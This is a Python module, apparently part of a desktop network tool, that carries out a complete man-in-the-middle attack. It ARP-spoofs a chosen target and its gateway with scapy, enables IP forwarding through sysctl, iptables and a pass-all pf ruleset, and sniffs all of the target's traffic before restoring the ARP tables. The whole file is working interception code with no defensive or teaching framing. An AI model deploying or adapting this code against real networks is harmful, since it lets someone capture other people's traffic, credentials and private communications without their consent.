"""
MITM orchestrator — ARP spoof a target + sniff its traffic.
"""

import re
import subprocess
import time

import scapy.all as scapy
from PySide6.QtCore import QThread, Signal  # pylint: disable=E0611
from scapy.all import ARP, Ether, sniff  # pylint: disable=E0611

from core.platform import get_os

_PF_PASS_RULE = "pass all\n"


def _pf_enable_forwarding():
    """Load a minimal pf ruleset that passes all traffic for forwarding."""
    try:
        # Back up the current ruleset so we can restore it later
        result = subprocess.run(
            ["pfctl", "-s", "rules"], capture_output=True, text=True, check=False
        )
        _pf_enable_forwarding._saved_rules = (  # pylint: disable=protected-access
            result.stdout if result.returncode == 0 else ""
        )

        # Load a pass-all ruleset
        subprocess.run(
            ["pfctl", "-f", "-"],
            input=_PF_PASS_RULE,
            text=True,
            check=True,
            capture_output=True,
        )
        # Enable pf in case it was disabled
        subprocess.run(["pfctl", "-e"], capture_output=True, check=False)
        print("[MITM] pf set to pass all (forwarding enabled)")
    except subprocess.CalledProcessError as e:
        print(f"[MITM] pf setup failed (run as root/sudo?): {e}")


_pf_enable_forwarding._saved_rules = ""  # pylint: disable=protected-access


def _pf_disable_forwarding():
    """Restore the pf ruleset that was active before MITM started."""
    saved = _pf_enable_forwarding._saved_rules  # pylint: disable=protected-access
    try:
        if saved.strip():
            subprocess.run(
                ["pfctl", "-f", "-"],
                input=saved,
                text=True,
                capture_output=True,
                check=False,
            )
            print("[MITM] pf ruleset restored")
        else:
            # Nothing was saved — just flush rules and disable
            subprocess.run(["pfctl", "-F", "rules"], capture_output=True, check=False)
            print("[MITM] pf rules flushed")
    except subprocess.CalledProcessError as e:
        print(f"[MITM] pf restore failed: {e}")


def _set_ip_forwarding(enable: bool) -> bool:
    """Enable or disable IP forwarding so intercepted packets are relayed.
    On Linux also manages the iptables FORWARD chain.
    Returns True on success, False on failure."""
    val = "1" if enable else "0"
    os_name = get_os()
    try:
        if os_name == "linux":
            subprocess.run(
                ["sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                check=True,
                capture_output=True,
            )
            # Verify it actually took effect
            result = subprocess.check_output(
                ["sysctl", "-n", "net.ipv4.ip_forward"], text=True
            )
            if result.strip() != val:
                print(
                    f"[MITM] ip_forward verification failed: expected {val}, got {result.strip()}"
                )
                return False
            # Ensure iptables FORWARD chain accepts traffic
            if enable:
                subprocess.run(
                    ["iptables", "-P", "FORWARD", "ACCEPT"],
                    check=True,
                    capture_output=True,
                )
            else:
                subprocess.run(
                    ["iptables", "-P", "FORWARD", "DROP"],
                    capture_output=True,
                    check=False,
                )  # best-effort restore, not fatal
        elif os_name == "mac":
            subprocess.run(
                ["/usr/sbin/sysctl", "-w", f"net.inet.ip.forwarding={val}"],
                check=True,
                capture_output=True,
            )
            result = subprocess.check_output(
                ["/usr/sbin/sysctl", "-n", "net.inet.ip.forwarding"], text=True
            )
            if result.strip() != val:
                print(
                    f"[MITM] ip_forward verification failed: expected {val}, got {result.strip()}"
                )
                return False
            # Ensure pf passes forwarded traffic
            if enable:
                _pf_enable_forwarding()
            else:
                _pf_disable_forwarding()
        return True
    except subprocess.CalledProcessError as e:
        print(f"[MITM] ip_forward toggle failed (run as root/sudo?): {e}")
        return False


class MitmThread(QThread):
    """ARP-spoof a target/gateway pair and sniff the intercepted traffic."""

    packetCaptured = Signal(object)  # raw scapy packet
    statusChanged = Signal(str)
    stopped = Signal()  # emitted when fully cleaned up

    def __init__(self, interface, target_ip, gateway_ip, spoof_interval=2, parent=None):
        super().__init__(parent)
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoof_interval = spoof_interval
        self._running = False
        self._target_mac = None
        self._gateway_mac = None

    def stop(self):
        """Signal the thread to stop spoofing and clean up."""
        self._running = False  # thread will clean up and emit stopped

    def run(self):
        """Start the MITM attack: resolve MACs, enable forwarding, spoof and sniff."""
        self._running = True

        self._target_mac = _resolve_mac(self.target_ip, self.interface)
        self._gateway_mac = _resolve_mac(self.gateway_ip, self.interface)

        if not self._target_mac or not self._gateway_mac:
            self.statusChanged.emit(
                f"Could not resolve MACs for {self.target_ip} / {self.gateway_ip}"
            )
            self._running = False
            self.stopped.emit()
            return

        if not _set_ip_forwarding(True):
            self.statusChanged.emit(
                "WARNING: IP forwarding could not be enabled — "
                "traffic will be intercepted but NOT forwarded (target loses internet). "
                "Run phantom as root/sudo."
            )
        else:
            self.statusChanged.emit(
                f"MITM started — target: {self.target_ip} ({self._target_mac}), "
                f"gateway: {self.gateway_ip} ({self._gateway_mac})"
            )

        sniffer = _SnifferThread(self.interface, self.target_ip)
        sniffer.packetCaptured.connect(self.packetCaptured)
        sniffer.start()

        # Spoof loop — 100 ms ticks so stop() responds quickly
        while self._running:
            self._spoof(self.target_ip, self._target_mac, self.gateway_ip)
            self._spoof(self.gateway_ip, self._gateway_mac, self.target_ip)
            for _ in range(self.spoof_interval * 10):
                if not self._running:
                    break
                time.sleep(0.1)

        sniffer.stop()
        sniffer.wait(3000)  # max 3 s — scapy sniff has ~1 s timeout built in
        self._restore()
        _set_ip_forwarding(False)
        self.statusChanged.emit("MITM stopped — ARP tables restored.")
        self.stopped.emit()

    def _spoof(self, target_ip, target_mac, spoof_ip):
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
        )
        scapy.sendp(pkt, iface=self.interface, verbose=False)

    def _restore(self):
        for _ in range(4):
            scapy.sendp(
                Ether(dst=self._target_mac)
                / ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self._target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self._gateway_mac,
                ),
                iface=self.interface,
                verbose=False,
            )
            scapy.sendp(
                Ether(dst=self._gateway_mac)
                / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self._gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=self._target_mac,
                ),
                iface=self.interface,
                verbose=False,
            )
            time.sleep(0.2)


def _resolve_mac(ip: str, interface: str) -> str | None:
    """
    Resolve MAC for an IP.
    1. Check kernel ARP cache (only REACHABLE/STALE entries, not FAILED)
    2. Fall back to explicit Scapy ARP probe via srp()
    """
    try:
        out = subprocess.check_output(["ip", "neigh", "show", ip], text=True)
        # Only trust entries that actually have a MAC (exclude FAILED/INCOMPLETE)
        m = re.search(
            r"lladdr\s+([0-9a-f:]{17}).*(?:REACHABLE|STALE|DELAY|PROBE)",
            out,
            re.IGNORECASE,
        )
        if m:
            return m.group(1)
    except Exception:  # pylint: disable=broad-exception-caught
        pass

    # Explicit ARP probe — more reliable than getmacbyip() on wifi
    from scapy.all import srp  # pylint: disable=E0611

    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=interface,
        timeout=3,
        retry=3,
        verbose=False,
    )
    if ans:
        return ans[0][1].hwsrc
    return None


class _SnifferThread(QThread):
    packetCaptured = Signal(object)  # raw scapy packet

    def __init__(self, interface, target_ip, parent=None):
        super().__init__(parent)
        self.interface = interface
        self.target_ip = target_ip
        self._running = False

    def stop(self):
        """Signal the sniffer to stop."""
        self._running = False

    def run(self):
        """Sniff packets from/to the target IP until stopped."""
        self._running = True
        bpf = f"host {self.target_ip} and not arp"
        while self._running:
            sniff(
                iface=self.interface,
                filter=bpf,
                prn=self.packetCaptured.emit,
                stop_filter=lambda _: not self._running,
                store=False,
                timeout=1,
            )
